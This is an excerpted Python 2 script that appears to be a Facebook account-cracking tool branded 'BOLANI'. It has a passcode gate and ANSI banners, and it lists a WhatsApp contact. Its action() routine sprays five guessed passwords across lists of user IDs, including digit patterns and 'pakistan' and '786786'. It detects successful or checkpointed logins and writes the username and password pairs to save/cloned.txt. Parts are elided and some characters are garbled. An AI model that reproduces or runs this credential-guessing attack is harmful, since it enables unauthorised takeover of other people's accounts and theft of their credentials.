...
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mBOLANIâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
...
▒█▄▄▀ ▒█▄▄▄ ▒█░▒█ ▒█▄▄▀
 ...
 \033[1;96m          \x1b[1;93mWHATSAPP Number BOLANI +923183700115
...
while (loop == 'true'):
    ...
    if (passcode == CorrectPasscode):
            print """
            \033[1;94mWelcome to All friend
                  """
            loop = 'false'
    else:
            print "\033[1;91mâ˜ ï¸GALAT"
...
def login():
    os.system('clear')
    print logo1
    print "\033[1;96m[1]\x1b[1;91mStart cloning ( no login )"
    time.sleep(0.05)
...
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;94m[1] BOLANI Start Cracking'
    time.sleep(0.05)
...
def action():
    ...
    jalan ("\033[1;95mBOLANIâ total 5 password will clone ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â 11 digit , last 7 digit, pakistan, 000786, 786786 password Start Cracking...")
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(BOLANI_CP) ' + k + c + user + '  |  ' + pass1
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m(BOLANI_CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(BOLANI_CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;92m(BOLANI_CP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;92m(BOLANI_CP) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
    ...
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'BOLANI TRICKER Process Has Been Completedâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’...100%'
    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
    print('BlackTiger Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your BOLANI(CP)Accounts Open after 7 to 10 days")
    print ''
    print """
...
\033[1;91mThanks \033[1;97mUseing My ZULFIQAR Tool
"""
